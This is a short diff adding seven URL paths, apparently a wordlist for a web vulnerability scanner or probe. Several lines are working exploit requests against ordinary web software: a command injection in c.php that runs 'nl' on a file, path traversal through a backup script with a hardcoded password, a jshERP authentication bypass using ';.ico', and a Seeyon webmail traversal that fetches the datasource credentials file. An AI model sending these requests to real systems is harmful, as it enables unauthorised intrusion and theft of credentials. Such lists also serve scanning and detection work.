@@ -1,0 +1,7 @@
+/tool/log/c.php?strip_slashes=printf&host=nl+c.php
+/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+/jshERP-boot/user/getAllList;.ico
+/WEB_VMS/LEVEL15/
+/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+/api/v1/GetSrc
+/api/v1/GetDevice
